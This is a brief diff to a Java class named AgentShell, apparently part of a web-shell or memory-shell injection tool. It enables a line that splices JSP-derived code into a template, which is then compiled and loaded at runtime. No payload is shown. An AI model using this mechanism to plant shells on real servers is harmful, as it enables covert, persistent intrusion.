@@ -63,7 +63,7 @@ public class AgentShell {
         code = new String(bytes);
         code = Eval.getJavaCodeFromJSP(code);
         code = code.replace("%path%",jarPath);
-//        java = java.replace("int flag2 = 0;",code);
+        java = java.replace("int flag2 = 0;",code);
 
         byte[] b = JavaCompiler.compile("AgentShell",java);
         Class c = ClassFiles.bytesAsClass(b);
